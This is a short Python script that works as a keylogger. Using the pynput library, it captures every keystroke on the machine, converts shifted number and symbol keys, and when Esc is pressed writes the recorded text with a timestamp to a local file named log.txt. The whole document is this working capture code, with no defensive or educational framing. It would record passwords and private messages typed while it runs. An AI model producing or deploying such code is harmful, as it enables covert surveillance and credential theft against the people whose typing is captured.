from pynput import keyboard
import time

alpha = "abcdefghijklmnopqrstuvwxyz"
num   = "1234567890"
sym1  = "-=[];'#,./\\`"
sym2  = {"1":"!","2":"\"","3":"£","4":"$","5":"%","6":"^","7":"&","8":"*","9":"(","0":")","`":"¬","-":"_","=":"+","[":"{","]":"}",";":":","'":"@","#":"~",",":"<",".":">","/":"?","\\":"|"}

def main():
	with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
		print("Press esc to quit")
		listener.join()

def on_press(key):
	global shift
	key = str(key).strip("'")
	
	if key == "Key.space":
		word.append(" ")

	elif key == "Key.enter":
		word.append("\n")
	
	elif key == "Key.esc": 
		with open("log.txt", "a") as log:
			log.write("\n[@]"+time.asctime()+"\n")
			for char in word:
				log.write(char)
		return False
	
	elif key in alpha:
		word.append(key)

	elif key in num:
		if shift == True:
			word.append(sym2[key])
			shift = False
		else:
			word.append(key)
	
	elif key in sym1:
		if shift == True:
			word.append(sym2[key])
			shift = False
		else:
			word.append(key)

	elif key == "Key.shift" or key == "Key.shift_r":
		shift = True
	
	else:
		word.append(" ["+key+"] ")

def on_release(key):
	return True

if __name__ == "__main__":
	word  = []
	shift = False
	main()